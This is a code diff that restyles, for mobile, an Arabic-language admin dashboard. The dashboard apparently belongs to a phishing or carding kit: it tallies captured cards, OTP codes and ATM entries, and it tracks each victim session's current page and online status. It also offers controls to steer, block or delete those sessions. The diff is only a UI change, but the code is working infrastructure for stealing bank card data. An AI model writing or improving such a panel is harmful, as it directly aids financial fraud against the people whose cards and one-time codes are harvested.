@@ -894,123 +894,132 @@ export default function AdminDashboard() {
 
   return (
     <div className="min-h-screen bg-slate-100" dir="rtl">
-      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg">
-        <div className="mx-auto flex max-w-6xl flex-col gap-4 px-4 py-4 sm:px-6 lg:px-8">
-          <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-            <div className="space-y-2 text-right">
-              <div className="flex flex-wrap items-center gap-2 text-lg font-bold text-slate-900">
-                <ShieldCheck className="h-5 w-5 text-blue-600" />
-                لوحة التحكم الإدارية
-              </div>
-              <p className="text-sm text-slate-500">تواصل مع بيانات الجلسات من أي مكان، وأدر المستخدمين بسهولة.</p>
+      {/* Mobile-First Header */}
+      <header className="sticky top-0 z-30 border-b border-slate-200 bg-white/95 backdrop-blur-lg safe-area-pb">
+        <div className="px-3 py-3">
+          {/* Title Row */}
+          <div className="flex items-center justify-between mb-3">
+            <div className="flex items-center gap-2">
+              <ShieldCheck className="w-5 h-5 text-blue-600" />
+              <h1 className="text-base font-bold text-slate-900">لوحة التحكم</h1>
             </div>
-            <div className="flex flex-wrap items-center gap-2 justify-end">
-              <Button size="sm" variant="outline" onClick={fetchData}>تحديث</Button>
-              <Button size="sm" onClick={() => setSettingsOpen(true)}>إعدادات العروض</Button>
-              <Button size="sm" variant="secondary" onClick={() => setPasswordOpen(true)}>تغيير كلمة المرور</Button>
-              <Button size="sm" variant="destructive" onClick={handleLogoutAll}>خروج من كل الأجهزة</Button>
-              <Button size="sm" variant="ghost" onClick={handleLogout}>خروج</Button>
+            <button
+              onClick={handleLogout}
+              className="p-2 rounded-xl bg-slate-100 text-slate-600 active:bg-slate-200 text-xs"
+            >
+              خروج
+            </button>
+          </div>
+
+          {/* Stats - Horizontal Scroll */}
+          <div className="flex gap-2 overflow-x-auto pb-2 -mx-1 px-1 snap-x">
+            <div className="flex-shrink-0 w-24 rounded-2xl border border-slate-200 bg-white p-3 text-center snap-start">
+              <div className="text-[10px] text-slate-500">الجلسات</div>
+              <div className="text-2xl font-bold text-slate-900">{sessionCount}</div>
+            </div>
+            <div className="flex-shrink-0 w-24 rounded-2xl border border-slate-200 bg-white p-3 text-center snap-start">
+              <div className="text-[10px] text-slate-500">البطاقات</div>
+              <div className="text-2xl font-bold text-red-600">{cardCount}</div>
+            </div>
+            <div className="flex-shrink-0 w-24 rounded-2xl border border-slate-200 bg-white p-3 text-center snap-start">
+              <div className="text-[10px] text-slate-500">OTP</div>
+              <div className="text-2xl font-bold text-orange-600">{otpCount}</div>
+            </div>
+            <div className="flex-shrink-0 w-24 rounded-2xl border border-slate-200 bg-white p-3 text-center snap-start">
+              <div className="text-[10px] text-slate-500">ينتظر</div>
+              <div className="text-2xl font-bold text-blue-600">{pendingCount}</div>
+            </div>
+            <div className="flex-shrink-0 w-24 rounded-2xl border border-slate-200 bg-white p-3 text-center snap-start">
+              <div className="text-[10px] text-slate-500">محظور</div>
+              <div className="text-2xl font-bold text-red-600">{blockedCount}</div>
             </div>
           </div>
 
-          <div className="grid gap-3 sm:grid-cols-3">
-            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
-              <div className="text-xs text-slate-500">الجلسات</div>
-              <div className="mt-2 text-3xl font-bold text-slate-900">{sessionCount}</div>
-            </div>
-            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
-              <div className="text-xs text-slate-500">الإدخالات</div>
-              <div className="mt-2 text-3xl font-bold text-slate-900">{stats?.totalSubmissions ?? 0}</div>
-            </div>
-            <div className="rounded-3xl border border-slate-200 bg-white p-4 text-right">
-              <div className="flex items-center justify-between text-xs text-slate-500">
-                <span>محظور / مهملات</span>
-                <Badge className="bg-slate-100 text-slate-700">{blockedCount}</Badge>
-              </div>
-              <div className="mt-2 text-3xl font-bold text-slate-900">{trashedCount}</div>
-            </div>
+          {/* Action Buttons - 2 columns on mobile */}
+          <div className="grid grid-cols-2 gap-2 mt-3">
+            <button
+              onClick={fetchData}
+              className="flex items-center justify-center gap-2 rounded-xl bg-blue-500 text-white py-2.5 text-sm font-medium active:bg-blue-600"
+            >
+              🔄 تحديث
+            </button>
+            <button
+              onClick={() => setSettingsOpen(true)}
+              className="flex items-center justify-center gap-2 rounded-xl bg-slate-100 text-slate-700 py-2.5 text-sm font-medium active:bg-slate-200"
+            >
+              ⚙️ العروض
+            </button>
+            <button
+              onClick={() => setPasswordOpen(true)}
+              className="flex items-center justify-center gap-2 rounded-xl bg-slate-100 text-slate-700 py-2.5 text-sm font-medium active:bg-slate-200"
+            >
+              🔑 كلمة المرور
+            </button>
+            <button
+              onClick={handleLogoutAll}
+              className="flex items-center justify-center gap-2 rounded-xl bg-red-50 text-red-600 py-2.5 text-sm font-medium active:bg-red-100"
+            >
+              🚪 خروج الكل
+            </button>
           </div>
         </div>
       </header>
 
-      <main className="mx-auto max-w-6xl px-4 py-6 sm:px-6 lg:px-8 space-y-6">
-        <div className="grid gap-3 sm:grid-cols-4">
-          <StatCard label="البطاقات" value={cardCount} icon={<CreditCard className="w-4 h-4" />} color="bg-red-100 text-red-600" />
-          <StatCard label="OTP" value={otpCount} icon={<KeyRound className="w-4 h-4" />} color="bg-orange-100 text-orange-600" />
-          <StatCard label="ATM" value={atmCount} icon={<Banknote className="w-4 h-4" />} color="bg-yellow-100 text-yellow-700" />
-          <StatCard label="قيد المتابعة" value={pendingCount} icon={<Clock className="w-4 h-4" />} color="bg-blue-100 text-blue-600" />
+      <main className="px-3 py-4 space-y-4">
+        {/* Sessions Section - Mobile Optimized */}
+        <div className="flex items-center justify-between">
+          <div>
+            <h2 className="text-sm font-semibold text-slate-900">الجلسات النشطة</h2>
+            <p className="text-xs text-slate-500">{sessionCount} جلسة • {cardCount} بطاقة</p>
+          </div>
+          <div className="flex items-center gap-2">
+            {selectedIds.length > 0 && (
+              <button
+                onClick={handleDeleteSelected}
+                className="px-3 py-1.5 rounded-xl bg-red-50 text-red-600 text-xs font-medium active:bg-red-100"
+              >
+                حذف ({selectedIds.length})
+              </button>
+            )}
+            <button
+              onClick={() => { allSelected ? setSelectedIds([]) : setSelectedIds(Object.keys(sessions)); }}
+              className="px-3 py-1.5 rounded-xl bg-slate-100 text-slate-600 text-xs font-medium active:bg-slate-200"
+            >
+              {allSelected ? "إلغاء" : "تحديد الكل"}
+            </button>
+          </div>
         </div>
 
-        <section className="rounded-3xl border border-slate-200 bg-white p-4">
-          <div className="mb-4 flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-            <div className="text-right">
-              <h2 className="text-lg font-semibold text-slate-900">الجلسات</h2>
-              <p className="text-sm text-slate-500">اختر جلسة للعمل عليها أو حظر مستخدم أو حذف الجلسة.</p>
-            </div>
-            <div className="flex flex-wrap items-center gap-2 text-xs text-slate-500">
-              <span>{sessionCount} جلسة</span>
-              <span>|</span>
-              <span>{cardCount} بطاقة</span>
-              <span>|</span>
-              <span>{otpCount} OTP</span>
-            </div>
+        {/* Sessions List */}
+        {sessionCount === 0 ? (
+          <div className="rounded-2xl border-2 border-dashed border-slate-300 bg-slate-50 p-8 text-center">
+            <p className="text-sm text-slate-500">لا يوجد جلسات حالياً</p>
           </div>
-
-          {sessionCount === 0 ? (
-            <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-10 text-center text-slate-500">
-              لا يوجد جلسات حالياً
-            </div>
-          ) : (
-            <div className="space-y-4">
-              <div className="flex flex-wrap items-center justify-between gap-3 text-xs text-slate-500">
-                <div className="flex items-center gap-3">
-                  <label className="inline-flex items-center gap-2">
-                    <input
-                      type="checkbox"
-                      checked={allSelected}
-                      onChange={() => {
-                        if (allSelected) setSelectedIds([]);
-                        else setSelectedIds(Object.keys(sessions));
-                      }}
-                      className="h-4 w-4 rounded border-slate-300 text-blue-600"
-                    />
-                    تحديد الكل
-                  </label>
-                  <span>{selectedIds.length} محدد</span>
-                </div>
-                <button
-                  type="button"
-                  disabled={selectedIds.length === 0}
-                  onClick={handleDeleteSelected}
-                  className="rounded-3xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >نقل المحدد إلى المهملات</button>
-              </div>
-              <div className="space-y-4">
-                {Object.entries(sessions).map(([sessionId, rows]) => (
-                  <SessionBox
-                    key={sessionId}
-                    sessionId={sessionId}
-                    rows={rows}
-                    selected={selectedIds.includes(sessionId)}
-                    onToggleSelect={() => {
-                      setSelectedIds((current) => current.includes(sessionId)
-                        ? current.filter((id) => id !== sessionId)
-                        : [...current, sessionId]);
-                    }}
-                    blocked={blockedMap[sessionId]?.message}
-                    onControl={handleControlAction}
-                    onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
-                    onUnblock={() => handleUnblock(sessionId)}
-                    onDelete={() => handleDeleteSession(sessionId)}
-                    onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
-                    currentPage={trackingInfo[sessionId]?.currentPage}
-                    isOnline={trackingInfo[sessionId]?.isOnline}
-                  />
-                ))}
-              </div>
-            </div>
-          )}
-        </section>
+        ) : (
+          <div className="space-y-3">
+            {Object.entries(sessions).map(([sessionId, rows]) => (
+              <SessionBox
+                key={sessionId}
+                sessionId={sessionId}
+                rows={rows}
+                selected={selectedIds.includes(sessionId)}
+                onToggleSelect={() => {
+                  setSelectedIds((current) => current.includes(sessionId)
+                    ? current.filter((id) => id !== sessionId)
+                    : [...current, sessionId]);
+                }}
+                blocked={blockedMap[sessionId]?.message}
+                onControl={handleControlAction}
+                onBlock={() => handleBlock(sessionId, parseData(rows[0]?.data ?? null).ownerName)}
+                onUnblock={() => handleUnblock(sessionId)}
+                onDelete={() => handleDeleteSession(sessionId)}
+                onOpenHistory={() => setHistoryDialog({ sessionId, rows })}
+                currentPage={trackingInfo[sessionId]?.currentPage}
+                isOnline={trackingInfo[sessionId]?.isOnline}
+              />
+            ))}
+          </div>
+        )}
       </main>
 
       <SessionHistoryDialog
